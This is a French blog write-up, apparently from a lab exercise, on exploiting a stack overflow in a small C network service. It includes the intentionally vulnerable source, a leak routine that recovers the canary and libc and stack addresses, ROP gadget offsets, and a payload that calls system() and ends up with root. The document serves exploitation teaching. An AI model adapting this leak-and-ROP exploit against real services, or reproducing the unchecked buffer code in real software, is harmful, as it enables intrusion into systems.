---
title: Rapport d'Exploitation : Stack Overflow et ROP Chain
date: 2026-02-13
categories: [Security, Reverse, Pwn]
tags: [exploit, buffer-overflow, reverse, gdb, binary, ROP]
---
## Introduction
Ce rapport détaille l'analyse et l'exploitation d'une vulnérabilité de type dépassement de tampon (stack overflow) dans un service réseau écrit en C. L'objectif est de démontrer comment, malgré l'activation de protections modernes comme le Canary, l'ASLR et le NX (No-eXecute), un attaquant peut prendre le contrôle du flux d'exécution en utilisant la technique du ROP (Return Oriented Programming) pour exécuter du code arbitraire sur le système cible.

## Le Programme C
Le serveur écoute sur le port 5001 et traite des commandes envoyées par les clients. Voici le code source du service :

```C
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define WELCOME_MSG "Welcome on this super secure server! Good luck breaking it!\n"

void doprocessing (int sock) {
        uint8_t output_buff[1024];
        uint8_t command, size;
        size_t cursor = 0;

        write(sock, WELCOME_MSG, sizeof(WELCOME_MSG)-1);
        while (1) {
                read(sock, &command, 1);
                switch (command) {
                        case 0:
                                read(sock, &size, 1);
                                // Aucune vérification de limite : la performance avant tout !
                                read(sock, &output_buff[cursor], size);
                                cursor += size;
                                break;
                        case 0xFF:
                                write(sock, &cursor, 2);
                                write(sock, output_buff, cursor);
                                return;
                }
        }
}

// ... (Reste du code main pour la gestion des sockets)
```

### Environnement de développement

L'exploitation a été réalisée sur Ubuntu 24.04 via QEMU :

```Bash
qemu-system-x86_64 \
  -accel hvf \
  -smp cores=2,threads=1,sockets=1 \
  -m 4096 \
  -boot d \
  -cdrom ubuntu-24.04.3-desktop-amd64.iso \
  -netdev user,id=unet,hostfwd=tcp:127.0.0.1:2223-:22 \
  -device virtio-net,netdev=unet
```
### Compilation et Protections

Le binaire est compilé avec toutes les sécurités activées :
`gcc -Wall -pie -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -O2 -Wl,-z,now -Wl,-z,relro easy.c -o easy`

----

## 1. Trouver une vulnérabilité
Le code présente une vulnérabilité majeure dans la fonction doprocessing. La variable cursor et le champ size ne sont jamais validés par rapport à la taille de output_buff (1024 octets).

```C
case 0:
    read(sock, &size, 1); // Lit la taille depuis le socket
    read(sock, &output_buff[cursor], size); // Écrit sans vérifier les limites
    cursor += size; // Incrémente le curseur
    break;
```
Cette faille permet :

- `Un Stack Overflow` : En envoyant plus de 1024 octets, on écrase la pile (Stack Canary, adresses de retour).

- `Un Information Leak` : En utilisant la commande 0xFF, le programme renvoie cursor octets. Si cursor dépasse 1024, on peut lire les données sensibles sur la pile.

## 2. Leak de données (Contournement de l'ASLR et du Canary)
Pour construire notre exploit, nous devons d'abord récupérer (leaker) trois informations cruciales :

- Le Stack Canary : Pour ne pas faire planter le programme lors du retour de fonction.

- L'adresse de la LibC : Pour calculer l'emplacement de system().

- Une adresse de la Stack (R13 ou R12) : Pour servir d'ancre et localiser nos arguments.

![](/images/ROP/image1.png)

### Méthode de Leak

On remplit le buffer jusqu'à sa limite, puis on provoque un léger dépassement pour que la fonction write (appelée par 0xFF) continue de lire la pile au-delà du tampon.

```Python
def leak_data(s):
    # Remplit le buffer (1024 octets)
    data = b'A' * (0x408 - 1)
    # ... envoi des données par blocs ...
    # Dépassement pour atteindre les métadonnées
    s.sendall(b'\x00' + struct.pack('<B', 0xFF) + b'A')
    return get_data(s)
```
Voici la structure de la stack révélée par le leak :
![](/images/ROP/image2.png)

L'adresse de retour du main pointe dans la __libc_start_main. En soustrayant l'offset statique, on obtient l'adresse de base de la LibC, neutralisant ainsi l'ASLR.

![](/images/ROP/image3.png)

## 3. Qu'est-ce que le ROP (Return Oriented Programming) ?
Comme la pile est non-exécutable (NX), nous ne pouvons pas injecter de shellcode. Le ROP permet de détourner des morceaux de code existants (les gadgets) se terminant par l'instruction ret. En enchaînant ces gadgets sur la pile, on crée un nouveau flux d'exécution.

(Source : Hackndo - ROP)

## 4. Construction de la ROP Chain
Notre objectif est d'appeler system("id > pwned"). Pour cela, il nous faut :

Un gadget pop rdi ; ret pour placer l'adresse de notre commande dans le registre RDI (premier argument sous Linux x64).

L'adresse de la fonction system() dans la LibC.

L'adresse de la fonction exit() pour une sortie propre.

![](/images/ROP/image4.png)

### Calcul des Offsets

À l'aide de ROPgadget et gdb, nous calculons les distances par rapport à notre leak :

pop_rdi_ret = addr_libc + 0xe5591

addr_system = addr_libc + 0x2e586

addr_argument = addr_r12 + 0x18 (Pointe vers notre chaîne "id > pwned" placée en fin de payload).

## 5. Script d'exploitation final
Le script injecte le Canary à sa place légitime pour éviter la détection, puis écrase l'adresse de retour avec notre chaîne de gadgets.

```Python
# Extrait du payload final
payload = b'A' * 0x408
payload += struct.pack("<Q", canary)      # Restauration du canary
payload += b'A' * 0x28                   # Padding jusqu'à l'adresse de retour
payload += struct.pack("<Q", ret)         # Alignement stack (Stack Alignment)
payload += struct.pack("<Q", pop_rdi_ret)
payload += struct.pack("<Q", addr_cmd)    # Argument de system()
payload += struct.pack("<Q", addr_system)
payload += struct.pack("<Q", addr_exit)
payload += b"id > pwned\0"                # La commande à exécuter
```

## Conclusion
L'exploitation a été un succès. En exécutant le script, le serveur a interprété notre ROP chain et a exécuté la commande avec les privilèges root (puisque le binaire tournait avec ces droits).

Résultat :

```Bash
ubuntu@ubuntu:~/Desktop$ cat pwned
uid=0(root) gid=0(root) groups=0(root)
```
Cette démonstration prouve que les protections mémoire (Canary, PIE, NX) ne sont pas infaillibles si une faille permet un leak de données. La solution définitive reste dans la vérification systématique des bornes des buffers (bounds checking) et l'utilisation de fonctions sécurisées.